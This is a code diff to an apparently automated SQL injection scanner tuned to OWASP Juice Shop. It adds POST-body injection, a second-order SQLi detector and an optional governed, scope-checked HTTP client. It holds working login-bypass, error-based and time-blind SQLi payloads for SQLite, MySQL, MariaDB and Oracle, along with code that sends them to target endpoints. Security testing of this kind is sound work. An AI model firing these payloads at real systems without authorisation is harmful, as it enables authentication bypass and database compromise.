@@ -15,6 +15,7 @@ ponytail: juice-shop-tuned defaults (login/search paths, DB markers). General
 enough to drive off a dispatched url+data; widen markers/paths when a second
 target needs it.
 """
+
 from __future__ import annotations
 
 from typing import Any, Dict, List, Optional
@@ -27,7 +28,7 @@ import httpx
 _BYPASS_PAYLOADS = ("' OR 1=1--", "' OR true--", "admin@juice-sh.op'--", "' OR '1'='1")
 
 # Error-based payloads: break SQL syntax so the backend leaks a parse error.
-_ERROR_PAYLOADS = ("qwert'))--", "'))--", "') OR 1=1--", "'", "\"")
+_ERROR_PAYLOADS = ("qwert'))--", "'))--", "') OR 1=1--", "'", '"')
 
 # Substrings that only appear in a real DB engine's error page.
 _SQL_ERROR_MARKERS = (
@@ -76,7 +77,11 @@ _TIME_BLIND_PAYLOADS = (
     # SQLite — RANDOMBLOB forces measurable CPU work proportional to its arg.
     # The classic SLEEP() does not exist in SQLite; RANDOMBLOB(500000000) is the
     # same trick sqlmap uses for SQLite time-based detection.
-    ("sqlite", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(0))))--"),
+    (
+        "sqlite",
+        "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
+        "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(0))))--",
+    ),
     # MySQL / MariaDB
     ("mysql", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
     ("mariadb", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
@@ -87,7 +92,11 @@ _TIME_BLIND_PAYLOADS = (
     # Oracle (no SLEEP; UTL_INADDR.get_host_name against a non-resolving name is
     # the classic timing trick, but it needs network egress. Use a heavy
     # repeat loop instead — deterministic and offline.)
-    ("oracle", "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{n})=1--", "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',0)=1--"),
+    (
+        "oracle",
+        "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{n})=1--",
+        "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',0)=1--",
+    ),
 )
 
 
@@ -153,44 +162,68 @@ async def detect_error_based(
     url: str,
     *,
     param: Optional[str] = None,
+    method: str = "GET",
+    body_keys: Optional[list] = None,
 ) -> Optional[Dict[str, Any]]:
-    """GET syntax-breaking payloads into a query param; VALIDATED if the backend
-    returns a 5xx carrying a raw DB parse error. Returns evidence dict or None."""
+    """Inject syntax-breaking payloads into a query param or request body; VALIDATED if the backend
+    returns a 5xx carrying a raw DB parse error or reflects it in a 200 body. Returns evidence dict or None.
+    """
+    method = method.upper()
+    is_post = method in ("POST", "PUT", "PATCH")
+
     if param is None:
-        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
-        param = (list(q)[-1] if q else "q")
+        if is_post and body_keys:
+            param = body_keys[-1]
+        else:
+            q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+            param = list(q)[-1] if q else "q"
 
-    # Baseline value for this param (so payloads modify the REAL value in place,
-    # e.g. "Gifts" -> "Gifts'"). Falls back to a benign token when absent.
-    q0 = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
-    base_val = q0.get(param) or "1"
+    # Reconstruct the request parameters or body dictionary
+    def _make_req_kwargs(value: str):
+        if is_post:
+            body = {}
+            for k in body_keys or [param]:
+                body[k] = value if k == param else "1"
+            return {"json": body}
+        else:
+            return {"params": {param: value}}
 
-    # Capture the baseline body once. Used only by the non-5xx marker path below
-    # to guarantee a DB-error string was INTRODUCED by the payload rather than
-    # already present in the page chrome (false-positive guard).
+    async def _send(value: str) -> httpx.Response:
+        kwargs = _make_req_kwargs(value)
+        if is_post:
+            return await client.request(method, url, **kwargs)
+        else:
+            return await client.get(_with_param(url, param, value), **kwargs)
+
+    # Baseline value for this param
+    base_val = "1"
+    if not is_post:
+        q0 = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+        base_val = q0.get(param) or "1"
+
+    # Capture the baseline body once to check for introduced errors.
     base_low = ""
     try:
-        r_base = await client.get(_with_param(url, param, base_val))
+        r_base = await _send(base_val)
         base_low = (r_base.text or "")[:1200].lower()
     except Exception:
         pass
 
     for payload in _ERROR_PAYLOADS:
         try:
-            r = await client.get(_with_param(url, param, payload))
+            r = await _send(payload)
         except Exception:
             continue
         body = (r.text or "")[:1200]
         low = body.lower()
         present = [m for m in _SQL_ERROR_MARKERS if m in low]
-        # Path A (original): a 5xx carrying a raw DB parse error is proof on its
-        # own — the server crashed on our syntax break.
-        # Path B (new): many backends (PHP/MySQL, classic ASP) echo the error in
-        # a 200 body. Accept that too, but only for a marker the payload
-        # INTRODUCED (absent from the benign baseline) so page chrome that merely
-        # mentions SQL can't trigger a false positive.
         introduced = [m for m in present if m not in base_low]
         if (r.status_code >= 500 and present) or introduced:
+            req_info = f"{method} {url}"
+            if is_post:
+                req_info += f" body={_make_req_kwargs(payload).get('json')}"
+            else:
+                req_info += f" query={param}={payload}"
             return {
                 "technique": "error_based",
                 "endpoint": url,
@@ -198,32 +231,16 @@ async def detect_error_based(
                 "payload": payload,
                 "http_status": r.status_code,
                 "db_error_excerpt": body[:300],
-                # Phase-1 issue #8: the error-based oracle already captured the
-                # full response body (truncated to 1200 chars above) but only
-                # stored a 300-char excerpt, so the scorer saw 'response' as
-                # missing on the SQLi finding (autonomous_scorecard showed
-                # evidence_completeness=0.333). Store the full captured body
-                # under the 'response' key so the scorer registers a real
-                # response artifact and the finding is evidence-complete.
                 "response": body,
-                "request": f"GET {_with_param(url, param, payload)}",
+                "request": req_info,
                 "confidence": 1.0,
             }
 
-    # Status-differential fallback. A realistic app (e.g. PortSwigger's demo)
-    # returns a GENERIC 500 with no raw DB string, so the marker check above
-    # can't fire. But injection still shows an objective, three-point signature:
-    #   baseline value           -> normal status (e.g. 200)
-    #   value + "'"              -> broken SQL      (differs; typically 5xx)
-    #   value + "'-- -"          -> comment repairs -> back to baseline status
-    # The repair step is what separates SQLi from a param that merely rejects odd
-    # input: a generic validation error would reject BOTH the quote and the
-    # commented quote. Requiring break!=baseline AND repair==baseline keeps this
-    # false-positive-safe.
+    # Status-differential fallback
     try:
-        rb = await client.get(_with_param(url, param, base_val))
-        r_break = await client.get(_with_param(url, param, base_val + "'"))
-        r_fix = await client.get(_with_param(url, param, base_val + "'-- -"))
+        rb = await _send(base_val)
+        r_break = await _send(base_val + "'")
+        r_fix = await _send(base_val + "'-- -")
     except Exception:
         return None
 
@@ -231,6 +248,11 @@ async def detect_error_based(
     broke = break_sc != baseline_sc and break_sc >= 500
     repaired = fix_sc == baseline_sc
     if broke and repaired:
+        req_info = f"{method} {url}"
+        if is_post:
+            req_info += f" body={_make_req_kwargs(base_val + chr(39)).get('json')}"
+        else:
+            req_info += f" query={param}={base_val + chr(39)}"
         return {
             "technique": "error_based",
             "endpoint": url,
@@ -242,7 +264,7 @@ async def detect_error_based(
                 f"break({base_val}')={break_sc}, repair({base_val}'-- -)={fix_sc}"
             ),
             "response": (r_break.text or "")[:1200],
-            "request": f"GET {_with_param(url, param, base_val + chr(39))}",
+            "request": req_info,
             "confidence": 1.0,
         }
     return None
@@ -255,58 +277,64 @@ async def detect_time_blind(
     param: Optional[str] = None,
     min_delta: float = 3.0,
     request_timeout: Optional[float] = None,
+    method: str = "GET",
+    body_keys: Optional[list] = None,
 ) -> Optional[Dict[str, Any]]:
-    """Time-based blind SQLi oracle.
-
-    VALIDATED iff a payload that asks the backend to SLEEP produces a response
-    measurably slower than an equivalent control payload that does NOT sleep.
-    Uses a relative timing delta (sleep - control), never an absolute threshold,
-    so a slow endpoint under a saturated link does not false-positive.
-
-    - Sends a control payload first, records its latency as the baseline.
-    - Sends the sleep payload; if (sleep_latency - baseline) >= min_delta seconds
-      the finding is validated for that DBMS family.
-    - Each candidate payload is paired with its own control to subtract per-DBMS
-      parsing overhead, not a single global baseline.
-    - min_delta defaults to 3.0s (SLEEP_SECONDS=5.0 with a 40% safety margin) so
-      network jitter under ~3s cannot trigger a false positive.
-
-    Returns an evidence dict with the validated DBMS family, the sleep and
-    control latencies, and the delta — or None if no payload reproduced.
-    """
+    """Time-based blind SQLi oracle. Supports GET and POST/PUT/PATCH body parameters."""
     import time
 
+    method = method.upper()
+    is_post = method in ("POST", "PUT", "PATCH")
+
     if param is None:
-        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
-        param = (list(q)[-1] if q else "q")
+        if is_post and body_keys:
+            param = body_keys[-1]
+        else:
+            q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+            param = list(q)[-1] if q else "q"
+
+    def _make_req_kwargs(value: str):
+        if is_post:
+            body = {}
+            for k in body_keys or [param]:
+                body[k] = value if k == param else "1"
+            return {"json": body}
+        else:
+            return {"params": {param: value}}
+
+    async def _send(value: str, timeout: Optional[float]) -> tuple[httpx.Response, float]:
+        kwargs = _make_req_kwargs(value)
+        t0 = time.monotonic()
+        if is_post:
+            r = await client.request(method, url, timeout=timeout, **kwargs)
+        else:
+            r = await client.get(_with_param(url, param, value), timeout=timeout, **kwargs)
+        return r, time.monotonic() - t0
 
     for dbms, sleep_tpl, control_tpl in _TIME_BLIND_PAYLOADS:
         sleep_payload = _format_payload(sleep_tpl)
         control_payload = _format_payload(control_tpl)
         # Baseline: send the control payload (same shape, no sleep).
         try:
-            t0 = time.monotonic()
-            rc = await client.get(url, params={param: control_payload}, timeout=request_timeout)
-            control_latency = time.monotonic() - t0
+            rc, control_latency = await _send(control_payload, request_timeout)
         except Exception:
             continue
-        # If the control itself timed out the endpoint is too slow to oracle.
         if rc.status_code == 404:
             continue
         # Sleep: send the real payload.
         try:
-            t0 = time.monotonic()
-            rs = await client.get(url, params={param: sleep_payload}, timeout=request_timeout)
-            sleep_latency = time.monotonic() - t0
+            rs, sleep_latency = await _send(sleep_payload, request_timeout)
         except httpx.TimeoutException:
-            # A timeout DURING the sleep payload but NOT during control is itself
-            # strong evidence — the backend hung on the injected sleep. Treat a
-            # control-success / sleep-timeout split as a validated finding.
             sleep_latency = request_timeout or SLEEP_SECONDS + 5
         except Exception:
             continue
         delta = sleep_latency - control_latency
         if delta >= min_delta:
+            req_info = f"{method} {url}"
+            if is_post:
+                req_info += f" body={_make_req_kwargs(sleep_payload).get('json')}"
+            else:
+                req_info += f" query={param}={sleep_payload}"
             return {
                 "technique": "time_blind",
                 "endpoint": url,
@@ -319,7 +347,65 @@ async def detect_time_blind(
                 "delta_seconds": round(delta, 3),
                 "min_delta": min_delta,
                 "http_status": rs.status_code if "rs" in locals() else None,
+                "response": (rs.text or "")[:1200] if "rs" in locals() else "TIMEOUT",
+                "request": req_info,
                 "confidence": 1.0,
+            }
+    return None
+
+
+async def detect_second_order_sqli(
+    client: httpx.AsyncClient,
+    store_url: str,
+    read_url: str,
+    *,
+    store_field: str = "comment",
+    store_method: str = "POST",
+    read_method: str = "GET",
+) -> Optional[Dict[str, Any]]:
+    """Second-order SQLi oracle: store a payload via one endpoint, then check if
+    it fires when read back by a different endpoint.
+
+    Many SQLi filters only check the first request (the write), but the payload
+    is later concatenated unsafely into a query on the read, which the filter
+    never inspects. This oracle injects a SQL error-breaker into a persisted
+    field, then reads the list endpoint and checks whether the DB error markers
+    appear in the response.
+
+    Returns evidence dict or None.
+    """
+    for payload in _ERROR_PAYLOADS:
+        # 1. Store the payload
+        try:
+            if store_method.upper() == "POST":
+                await client.post(store_url, json={store_field: payload})
+            else:
+                await client.request(store_method.upper(), store_url, json={store_field: payload})
+        except Exception:
+            continue
+
+        # 2. Read the list endpoint to trigger the stored payload
+        try:
+            if read_method.upper() == "GET":
+                r = await client.get(read_url)
+            else:
+                r = await client.request(read_method.upper(), read_url)
+        except Exception:
+            continue
+
+        body = (r.text or "")[:2000].lower()
+        present = [m for m in _SQL_ERROR_MARKERS if m in body]
+        if present:
+            return {
+                "technique": "second_order",
+                "store_url": store_url,
+                "read_url": read_url,
+                "store_field": store_field,
+                "payload": payload,
+                "http_status": r.status_code,
+                "markers_found": present,
+                "response_excerpt": body[:300],
+                "confidence": 0.9,
             }
     return None
 
@@ -333,6 +419,10 @@ async def scan_sqli(
     data: Optional[str] = None,
     timeout: float = 20.0,
     include_time_blind: bool = False,
+    second_order_store_url: Optional[str] = None,
+    second_order_read_url: Optional[str] = None,
+    second_order_field: str = "comment",
+    client: Optional[httpx.AsyncClient] = None,
 ) -> List[Dict[str, Any]]:
     """Run the applicable oracle(s) and return a list of VALIDATED evidence dicts.
 
@@ -342,39 +432,110 @@ async def scan_sqli(
       search url (covers blind/boolean-only injections that leak neither errors
       nor tokens). Off by default because the time-blind oracle issues 2 extra
       requests per DBMS family per candidate.
+    - second_order_store_url+second_order_read_url -> second-order SQLi oracle
     Defaults target OWASP Juice Shop's known injectable endpoints when only a base
     URL is given, so a bare engagement scope still gets a real scan.
+
+    ``client`` (MAJ-4, 2026-07-22): when supplied (e.g. a governed
+    ``httpx.AsyncClient`` from the scan path), the oracles run through it so
+    every probe is scope-checked, rate-limited, and research-tagged. When
+    ``None`` a raw cookie-less client is built (historical behavior) — callers
+    that want governance MUST pass a governed client.
     """
     base = base_or_url.rstrip("/")
     is_base = urlparse(base_or_url).path in ("", "/")
     if login_url is None:
-        login_url = f"{base}/rest/user/login" if is_base else (base_or_url if data is not None else None)
+        login_url = (
+            f"{base}/rest/user/login" if is_base else (base_or_url if data is not None else None)
+        )
     if search_url is None and is_base:
         search_url = f"{base}/rest/products/search"
 
     findings: List[Dict[str, Any]] = []
-    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout) as c:
-        if login_url:
-            ev = await detect_login_bypass(c, login_url)
-            if ev:
-                findings.append(ev)
-        # If a non-base GET url was supplied, error-test it directly too.
-        if search_url is None and not is_base and data is None:
-            search_url = base_or_url
-        if search_url:
-            param = search_param if urlparse(search_url).path.endswith("/search") else None
-            ev = await detect_error_based(c, search_url, param=param)
-            if ev:
-                findings.append(ev)
-            elif include_time_blind:
-                # Only run the slower time-blind oracle if error-based did not
-                # already confirm injection on this endpoint.
-                ev = await detect_time_blind(
-                    c, search_url, param=param, request_timeout=timeout
-                )
-                if ev:
-                    findings.append(ev)
+    # MAJ-4 (2026-07-22): use the caller-supplied governed client when available;
+    # only build a raw client when no client was passed (historical behavior).
+    if client is not None:
+        _owns_client = False
+        c = client
+        await _run_sqli_oracles(
+            c,
+            login_url,
+            search_url,
+            base_or_url,
+            is_base,
+            data,
+            search_param,
+            include_time_blind,
+            timeout,
+            second_order_store_url,
+            second_order_read_url,
+            second_order_field,
+            findings,
+        )
+    else:
+        _owns_client = True
+        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout) as c:
+            await _run_sqli_oracles(
+                c,
+                login_url,
+                search_url,
+                base_or_url,
+                is_base,
+                data,
+                search_param,
+                include_time_blind,
+                timeout,
+                second_order_store_url,
+                second_order_read_url,
+                second_order_field,
+                findings,
+            )
     return findings
+
+
+async def _run_sqli_oracles(
+    c,
+    login_url,
+    search_url,
+    base_or_url,
+    is_base,
+    data,
+    search_param,
+    include_time_blind,
+    timeout,
+    second_order_store_url,
+    second_order_read_url,
+    second_order_field,
+    findings,
+):
+    """Helper that runs the SQLi oracle suite against a given client.
+
+    Extracted so ``scan_sqli`` can call it against EITHER a caller-supplied
+    governed client OR a self-built raw client (MAJ-4)."""
+    if login_url:
+        ev = await detect_login_bypass(c, login_url)
+        if ev:
+            findings.append(ev)
+    if search_url is None and not is_base and data is None:
+        search_url = base_or_url
+    if search_url:
+        param = search_param if urlparse(search_url).path.endswith("/search") else None
+        ev = await detect_error_based(c, search_url, param=param)
+        if ev:
+            findings.append(ev)
+        elif include_time_blind:
+            ev = await detect_time_blind(c, search_url, param=param, request_timeout=timeout)
+            if ev:
+                findings.append(ev)
+    if second_order_store_url and second_order_read_url:
+        ev = await detect_second_order_sqli(
+            c,
+            second_order_store_url,
+            second_order_read_url,
+            store_field=second_order_field,
+        )
+        if ev:
+            findings.append(ev)
 
 
 if __name__ == "__main__":
